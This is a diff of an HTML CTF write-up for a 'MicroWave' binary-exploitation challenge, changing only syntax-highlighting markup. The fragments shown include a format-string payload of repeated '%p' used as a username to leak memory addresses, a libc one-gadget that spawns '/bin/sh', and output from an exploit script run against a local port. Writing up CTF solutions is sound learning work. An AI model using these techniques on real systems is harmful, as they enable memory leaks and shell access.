@@ -197,13 +197,13 @@ connecting to twitter:</p>
  <span class="p">|</span>                         ***                          <span class="p">|</span>
  --------------------------------------------------------
            ----------------------------------
-           <span class="p">|</span>  1. Connect to Twitter account <span class="p">|</span>
-           <span class="p">|</span>  2. Edit your tweet            <span class="p">|</span>
-           <span class="p">|</span>  3. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">1</span>. Connect to Twitter account <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">2</span>. Edit your tweet            <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">3</span>. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
            <span class="p">|</span>  q. Exit                       <span class="p">|</span>
            ----------------------------------
 
-           <span class="o">[</span>MicroWave<span class="o">]</span>: 1
+           <span class="o">[</span>MicroWave<span class="o">]</span>: <span class="m">1</span>
 
            Log in on Twitter:
            username: %p.%p.%p.%p.%p.%p.%p.%p
@@ -276,8 +276,8 @@ jne 0x106a ;[e]
 However looking into the provided libc shows that the <em>magic</em> ROP chain
 is present.</p>
 <div class="highlight"><pre><span></span><span class="nl">.text:</span><span class="err">000000000004652</span><span class="nf">C</span> <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">environ_ptr_0</span>
-<span class="nl">.text:</span><span class="err">0000000000046533</span> <span class="nf">lea</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">aBinSh</span>     <span class="err">;</span> <span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span>
-<span class="nl">.text:</span><span class="err">000000000004653</span><span class="nf">A</span> <span class="no">lea</span>     <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">180</span><span class="no">h</span><span class="err">+</span><span class="no">var_150</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0000000000046533</span> <span class="nf">lea</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">aBinSh</span>     <span class="c">; &quot;/bin/sh&quot;</span>
+<span class="no">.text</span><span class="p">:</span><span class="mi">000000000004653</span><span class="no">A</span> <span class="no">lea</span>     <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">180</span><span class="no">h</span><span class="err">+</span><span class="no">var_150</span><span class="p">]</span>
 <span class="nl">.text:</span><span class="err">000000000004653</span><span class="nf">F</span> <span class="no">mov</span>     <span class="no">cs</span><span class="p">:</span><span class="no">dword_3C06C0</span><span class="p">,</span> <span class="mi">0</span>
 <span class="nl">.text:</span><span class="err">0000000000046549</span> <span class="nf">mov</span>     <span class="no">cs</span><span class="p">:</span><span class="no">dword_3C06D0</span><span class="p">,</span> <span class="mi">0</span>
 <span class="nl">.text:</span><span class="err">0000000000046553</span> <span class="nf">mov</span>     <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
@@ -314,13 +314,13 @@ Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
  <span class="p">|</span>                         ***                          <span class="p">|</span>
  --------------------------------------------------------
            ----------------------------------
-           <span class="p">|</span>  1. Connect to Twitter account <span class="p">|</span>
-           <span class="p">|</span>  2. Edit your tweet            <span class="p">|</span>
-           <span class="p">|</span>  3. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">1</span>. Connect to Twitter account <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">2</span>. Edit your tweet            <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">3</span>. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
            <span class="p">|</span>  q. Exit                       <span class="p">|</span>
            ----------------------------------
 
-           <span class="o">[</span>MicroWave<span class="o">]</span>: 1
+           <span class="o">[</span>MicroWave<span class="o">]</span>: <span class="m">1</span>
 
            Log in on Twitter:
            username: %p.%p.%p.%p.%p
@@ -330,9 +330,9 @@ Checking 0xa.0x7ffff7b02870.0x7ffff7ff3740.0x555555556ac0.<span class="o">(</spa
 Twitter account
 ............
            ----------------------------------
-           <span class="p">|</span>  1. Connect to Twitter account <span class="p">|</span>
-           <span class="p">|</span>  2. Edit your tweet            <span class="p">|</span>
-           <span class="p">|</span>  3. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">1</span>. Connect to Twitter account <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">2</span>. Edit your tweet            <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">3</span>. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
            <span class="p">|</span>  q. Exit                       <span class="p">|</span>
            ----------------------------------
 
@@ -429,7 +429,7 @@ Start              End                Perm  Name
 
 <p>It is then possible to <code>cat</code> the flag.</p>
 <div class="highlight"><pre><span></span>$ ./microwave-pwn.py
-<span class="o">[</span>+<span class="o">]</span> Opening connection to 127.0.0.1 on port 1337: Done
+<span class="o">[</span>+<span class="o">]</span> Opening connection to <span class="m">127</span>.0.0.1 on port <span class="m">1337</span>: Done
 
  --------------------------------------------------------
  <span class="p">|</span>     Welcome to the next generation of MicroWaves!    <span class="p">|</span>
@@ -439,9 +439,9 @@ Start              End                Perm  Name
  <span class="p">|</span>                         ***                          <span class="p">|</span>
  --------------------------------------------------------
            ----------------------------------
-           <span class="p">|</span>  1. Connect to Twitter account <span class="p">|</span>
-           <span class="p">|</span>  2. Edit your tweet            <span class="p">|</span>
-           <span class="p">|</span>  3. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">1</span>. Connect to Twitter account <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">2</span>. Edit your tweet            <span class="p">|</span>
+           <span class="p">|</span>  <span class="m">3</span>. Grill <span class="p">&amp;</span> Tweet your food    <span class="p">|</span>
            <span class="p">|</span>  q. Exit                       <span class="p">|</span>
            ----------------------------------
 
